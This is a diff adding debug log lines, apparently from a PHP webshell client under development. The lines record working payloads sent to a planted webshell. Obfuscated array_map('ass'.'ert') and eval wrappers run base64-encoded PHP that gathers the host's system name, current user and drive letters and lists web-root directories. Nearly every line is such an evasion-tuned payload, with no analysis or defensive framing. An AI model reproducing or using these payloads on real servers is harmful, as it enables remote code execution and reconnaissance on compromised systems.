@@ -159,3 +159,428 @@ tt
 2018-10-07 21:21:37,860:59:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('JEQ9Jy92YXIvd3d3L2h0bWwnOyRGPUBvcGVuZGlyKCREKTtpZigkRj09TlVMTCl7ZWNobygiRVJST1I6Ly8gUGF0aCBOb3QgRm91bmQgT3IgTm8gUGVybWlzc2lvbiEiKTt9ZWxzZXskTT1OVUxMOyRMPU5VTEw7d2hpbGUoJE49QHJlYWRkaXIoJEYpKXskUD0kRC4nLycuJE47JFQ9QGRhdGUoIlktbS1kIEg6aTpzIixAZmlsZW10aW1lKCRQKSk7QCRFPXN1YnN0cihiYXNlX2NvbnZlcnQoQGZpbGVwZXJtcygkUCksMTAsOCksLTQpOyRSPSJcdCIuJFQuIlx0Ii5AZmlsZXNpemUoJFApLiJcdCIuJEUuIlxuIjtpZihAaXNfZGlyKCRQKSkkTS49JE4uIi8iLiRSO2Vsc2UgJEwuPSROLiRSO31lY2hvICRNLiRMO0BjbG9zZWRpcigkRik7fQ=='));\");"));
 2018-10-07 21:27:32,339:59:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('JEQ9Jy92YXIvd3d3L2h0bWwnOyRGPUBvcGVuZGlyKCREKTtpZigkRj09TlVMTCl7ZWNobygiRVJST1I6Ly8gUGF0aCBOb3QgRm91bmQgT3IgTm8gUGVybWlzc2lvbiEiKTt9ZWxzZXskTT1OVUxMOyRMPU5VTEw7d2hpbGUoJE49QHJlYWRkaXIoJEYpKXskUD0kRC4nLycuJE47JFQ9QGRhdGUoIlktbS1kIEg6aTpzIixAZmlsZW10aW1lKCRQKSk7QCRFPXN1YnN0cihiYXNlX2NvbnZlcnQoQGZpbGVwZXJtcygkUCksMTAsOCksLTQpOyRSPSJcdCIuJFQuIlx0Ii5AZmlsZXNpemUoJFApLiJcdCIuJEUuIlxuIjtpZihAaXNfZGlyKCRQKSkkTS49JE4uIi8iLiRSO2Vsc2UgJEwuPSROLiRSO31lY2hvICRNLiRMO0BjbG9zZWRpcigkRik7fQ=='));\");"));
 2018-10-07 21:29:00,210:59:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('JEQ9Jy8nOyRGPUBvcGVuZGlyKCREKTtpZigkRj09TlVMTCl7ZWNobygiRVJST1I6Ly8gUGF0aCBOb3QgRm91bmQgT3IgTm8gUGVybWlzc2lvbiEiKTt9ZWxzZXskTT1OVUxMOyRMPU5VTEw7d2hpbGUoJE49QHJlYWRkaXIoJEYpKXskUD0kRC4nLycuJE47JFQ9QGRhdGUoIlktbS1kIEg6aTpzIixAZmlsZW10aW1lKCRQKSk7QCRFPXN1YnN0cihiYXNlX2NvbnZlcnQoQGZpbGVwZXJtcygkUCksMTAsOCksLTQpOyRSPSJcdCIuJFQuIlx0Ii5AZmlsZXNpemUoJFApLiJcdCIuJEUuIlxuIjtpZihAaXNfZGlyKCRQKSkkTS49JE4uIi8iLiRSO2Vsc2UgJEwuPSROLiRSO31lY2hvICRNLiRMO0BjbG9zZWRpcigkRik7fQ=='));\");"));
+2018-10-14 22:12:13,474:73:DEBUG:Playload: b'\r\xd8\xab\x9d\xa9\x9e\x14\x82\xc4D;b~\xcb\x9b\xb2\xda\xc3\xd3_\xdf\xa2\xb7\x9ar\x1a\xda\x9e\x07\x80e\xab\x0b\x89\xf8\xacv*\xcbD\xb4'
+2018-10-14 22:12:13,505:92:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSOw=='));\");"));
+2018-10-14 22:12:13,614:73:DEBUG:Playload: b'\x0c<Z\x9a\x9aa\xb5\xda\x1c\xb0Z)zwb\xac8\x9f\x14\xd5\x0b-\xe7!\xa0DQ9\x1f\xff=\xaba6\x8bE\xa2\xe9\xdd:\xb3h=\xea\xe6\x8a\xcb"\xa2w\xa5\xb1\xe3'
+2018-10-14 22:12:13,614:92:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('JEQ9J0Q6XHhhbXBwXGh0ZG9jcyc7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELicvJy4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iXG4iO2lmKEBpc19kaXIoJFApKSRNLj0kTi4iLyIuJFI7ZWxzZSAkTC49JE4uJFI7fWVjaG8gJE0uJEw7QGNsb3NlZGlyKCRGKTt9'));\");"));
+2018-10-14 22:13:01,847:73:DEBUG:Playload: b'$D=dirname(__FILE__);$R="{$D}\\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\\t";$u=(function_exists(\'posix_getegid\'))?@posix_getpwuid(@posix_geteuid()):\'\';$usr=($u)?$u[\'name\']:@get_current_user();$R.=php_uname();$R.="({$usr})";print $R;'
+2018-10-14 22:13:01,847:92:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSOw=='));\");"));
+2018-10-14 22:13:01,957:73:DEBUG:Playload: b'$D=\'D:\\xampp\\htdocs\';$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.\'/\'.$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\\t".$T."\\t".@filesize($P)."\\t".$E."\\n";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);}'
+2018-10-14 22:13:01,957:92:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('JEQ9J0Q6XHhhbXBwXGh0ZG9jcyc7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELicvJy4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iXG4iO2lmKEBpc19kaXIoJFApKSRNLj0kTi4iLyIuJFI7ZWxzZSAkTC49JE4uJFI7fWVjaG8gJE0uJEw7QGNsb3NlZGlyKCRGKTt9'));\");"));
+2018-10-14 22:14:27,301:73:DEBUG:Playload: b'$D=dirname(__FILE__);$R="{$D}\\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\\t";$u=(function_exists(\'posix_getegid\'))?@posix_getpwuid(@posix_geteuid()):\'\';$usr=($u)?$u[\'name\']:@get_current_user();$R.=php_uname();$R.="({$usr})";print $R;'
+2018-10-14 22:14:27,301:92:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSOw=='));\");"));
+2018-10-14 22:14:27,425:73:DEBUG:Playload: b'$D=\'D:\\xampp\\htdocs\';$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.\'/\'.$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\\t".$T."\\t".@filesize($P)."\\t".$E."\\n";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);}'
+2018-10-14 22:14:27,425:92:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('JEQ9J0Q6XHhhbXBwXGh0ZG9jcyc7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELicvJy4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iXG4iO2lmKEBpc19kaXIoJFApKSRNLj0kTi4iLyIuJFI7ZWxzZSAkTC49JE4uJFI7fWVjaG8gJE0uJEw7QGNsb3NlZGlyKCRGKTt9'));\");"));
+2018-10-14 22:17:52,987:73:DEBUG:Playload: echo "PGP";$D=dirname(__FILE__);$R="{$D}\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\t";$u=(function_exists('posix_getegid'))?@posix_getpwuid(@posix_geteuid()):'';$usr=($u)?$u['name']:@get_current_user();$R.=php_uname();$R.="({$usr})";print $R;;echo "PGP"
+2018-10-14 22:18:51,988:74:DEBUG:Playload: b'echo "PGP";$D=dirname(__FILE__);$R="{$D}\\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\\t";$u=(function_exists(\'posix_getegid\'))?@posix_getpwuid(@posix_geteuid()):\'\';$usr=($u)?$u[\'name\']:@get_current_user();$R.=php_uname();$R.="({$usr})";print $R;;echo "PGP"'
+2018-10-14 22:18:51,988:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('ZWNobyAiUEdQIjskRD1kaXJuYW1lKF9fRklMRV9fKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8gIlBHUCI='));\");"));
+2018-10-14 22:19:41,221:74:DEBUG:Playload: b'print "PGP";$D=dirname(__FILE__);$R="{$D}\\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\\t";$u=(function_exists(\'posix_getegid\'))?@posix_getpwuid(@posix_geteuid()):\'\';$usr=($u)?$u[\'name\']:@get_current_user();$R.=php_uname();$R.="({$usr})";print $R;;print "PGP"'
+2018-10-14 22:19:41,221:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSOztwcmludCAiUEdQIg=='));\");"));
+2018-10-14 22:22:12,357:74:DEBUG:Playload: b'print "PGP";$D=dirname(__FILE__);$R="{$D}\\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\\t";$u=(function_exists(\'posix_getegid\'))?@posix_getpwuid(@posix_geteuid()):\'\';$usr=($u)?$u[\'name\']:@get_current_user();$R.=php_uname();$R.="({$usr})";print $R;print "PGP";'
+2018-10-14 22:22:12,357:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSO3ByaW50ICJQR1AiOw=='));\");"));
+2018-10-14 22:24:21,994:74:DEBUG:Playload: b'print "PGP";$D=\'PGPD:\\xampp\\htdocs\';$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.\'/\'.$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\\t".$T."\\t".@filesize($P)."\\t".$E."\\n";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);}print "PGP";'
+2018-10-14 22:24:21,994:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEQ9J1BHUEQ6XHhhbXBwXGh0ZG9jcyc7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELicvJy4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iXG4iO2lmKEBpc19kaXIoJFApKSRNLj0kTi4iLyIuJFI7ZWxzZSAkTC49JE4uJFI7fWVjaG8gJE0uJEw7QGNsb3NlZGlyKCRGKTt9cHJpbnQgIlBHUCI7'));\");"));
+2018-10-14 22:25:37,153:74:DEBUG:Playload: b'print "PGP";$D=dirname(__FILE__);$R="{$D}\\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\\t";$u=(function_exists(\'posix_getegid\'))?@posix_getpwuid(@posix_geteuid()):\'\';$usr=($u)?$u[\'name\']:@get_current_user();$R.=php_uname();$R.="({$usr})";print $R;print "PGP";'
+2018-10-14 22:25:37,153:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSO3ByaW50ICJQR1AiOw=='));\");"));
+2018-10-14 22:25:42,633:74:DEBUG:Playload: b'print "PGP";$D=dirname(__FILE__);$R="{$D}\\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\\t";$u=(function_exists(\'posix_getegid\'))?@posix_getpwuid(@posix_geteuid()):\'\';$usr=($u)?$u[\'name\']:@get_current_user();$R.=php_uname();$R.="({$usr})";print $R;print "PGP";'
+2018-10-14 22:25:42,633:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSO3ByaW50ICJQR1AiOw=='));\");"));
+2018-10-14 22:25:59,937:74:DEBUG:Playload: b'print "PGP";$D=dirname(__FILE__);$R="{$D}\\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\\t";$u=(function_exists(\'posix_getegid\'))?@posix_getpwuid(@posix_geteuid()):\'\';$usr=($u)?$u[\'name\']:@get_current_user();$R.=php_uname();$R.="({$usr})";print $R;print "PGP";'
+2018-10-14 22:25:59,953:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSO3ByaW50ICJQR1AiOw=='));\");"));
+2018-10-14 22:26:32,647:74:DEBUG:Playload: b'print "PGP";$D=dirname(__FILE__);$R="{$D}\\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\\t";$u=(function_exists(\'posix_getegid\'))?@posix_getpwuid(@posix_geteuid()):\'\';$usr=($u)?$u[\'name\']:@get_current_user();$R.=php_uname();$R.="({$usr})";print $R;print "PGP";'
+2018-10-14 22:26:32,647:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSO3ByaW50ICJQR1AiOw=='));\");"));
+2018-10-14 22:26:55,628:74:DEBUG:Playload: b'print "PGP";$D=dirname(__FILE__);$R="{$D}\\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\\t";$u=(function_exists(\'posix_getegid\'))?@posix_getpwuid(@posix_geteuid()):\'\';$usr=($u)?$u[\'name\']:@get_current_user();$R.=php_uname();$R.="({$usr})";print $R;print "PGP";'
+2018-10-14 22:26:55,628:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSO3ByaW50ICJQR1AiOw=='));\");"));
+2018-10-14 22:27:20,884:74:DEBUG:Playload: b'print "PGP";$D=dirname(__FILE__);$R="{$D}\\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\\t";$u=(function_exists(\'posix_getegid\'))?@posix_getpwuid(@posix_geteuid()):\'\';$usr=($u)?$u[\'name\']:@get_current_user();$R.=php_uname();$R.="({$usr})";print $R;print "PGP";'
+2018-10-14 22:27:20,884:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSO3ByaW50ICJQR1AiOw=='));\");"));
+2018-10-14 22:28:03,980:74:DEBUG:Playload: b'print "PGP";$D=dirname(__FILE__);$R="{$D}\\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\\t";$u=(function_exists(\'posix_getegid\'))?@posix_getpwuid(@posix_geteuid()):\'\';$usr=($u)?$u[\'name\']:@get_current_user();$R.=php_uname();$R.="({$usr})";print $R;print "PGP";'
+2018-10-14 22:28:03,980:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEQ9ZGlybmFtZShfX0ZJTEVfXyk7JFI9InskRH1cdCI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTClpZihpc19kaXIoInskTH06IikpJFIuPSJ7JEx9OiI7fSRSLj0iXHQiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSO3ByaW50ICJQR1AiOw=='));\");"));
+2018-10-14 22:28:05,805:74:DEBUG:Playload: b'print "PGP";$D=\'D:\\xampp\\htdocs\';$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.\'/\'.$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\\t".$T."\\t".@filesize($P)."\\t".$E."\\n";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);}print "PGP";'
